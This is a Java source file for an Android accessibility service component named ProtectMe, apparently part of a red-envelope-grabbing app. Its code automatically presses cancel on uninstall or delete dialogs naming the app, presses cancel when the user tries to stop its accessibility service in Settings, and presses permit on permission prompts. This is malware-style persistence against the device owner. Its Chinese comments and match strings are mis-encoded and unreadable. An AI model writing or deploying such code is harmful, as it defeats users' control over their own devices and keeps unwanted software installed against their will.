/**
 * 
 */
package accessibility.app;

import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import util.ConfigCt;

/**
 * @author ASUS
 *
 */
public class ProtectMe  extends BaseAccessibilityJob {
	private static ProtectMe current;
    private ProtectMe() {
    	super(null);
    }
    public static synchronized ProtectMe getProtectMe() {
        if(current == null) {
            current = new ProtectMe();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart();

	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
	/*
	 * (ˢ�´�������)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	
	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 
		 AccessibilityNodeInfo rootNode = event.getSource();
	     if (rootNode == null) return;
	     clickCancelUninstall(rootNode);
	     clickCancelStopAccessibility(rootNode);
	     clickPermitAccessibility(rootNode);
	}
	/*
	     * ���ȡ��ж�ذ�ť��
	*/
	public boolean clickCancelUninstall(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, ConfigCt.AppName,0);
		if(nodeInfo==null)return false;
		nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ж��",0);
		if(nodeInfo==null){
			nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ɾ��", 0);
			if(nodeInfo==null)return false;
		}
		nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "ȡ��", AccessibilityHelper.WIDGET_BUTTON);
		if(nodeInfo==null)return false;
		AccessibilityHelper.performClick(nodeInfo);
		return true;
	}
	/*
     * ���ȡ��ͣ�ð�ť��
     */
	public void clickCancelStopAccessibility(AccessibilityNodeInfo rootNode){
		if(rootNode.getPackageName()==null)return;
		if(!rootNode.getPackageName().toString().equals(AccessibilityHelper.PACKAG_ENAME_SETTING))return;
		AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, ConfigCt.AppName,0);
		if(nodeInfo==null)return;
		nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ͣ��",0);
		if(nodeInfo==null)return;
		nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "ȡ��", AccessibilityHelper.WIDGET_BUTTON);
		if(nodeInfo==null)return;
		AccessibilityHelper.performClick(nodeInfo);
		return;
	}
	/*
     * �������ť��
     */
	public void clickPermitAccessibility(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, ConfigCt.AppName,0);
		if(nodeInfo==null)return;
		nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "����", AccessibilityHelper.WIDGET_BUTTON);
		if(nodeInfo==null)return;
		AccessibilityHelper.performClick(nodeInfo);
		return;
	}
}
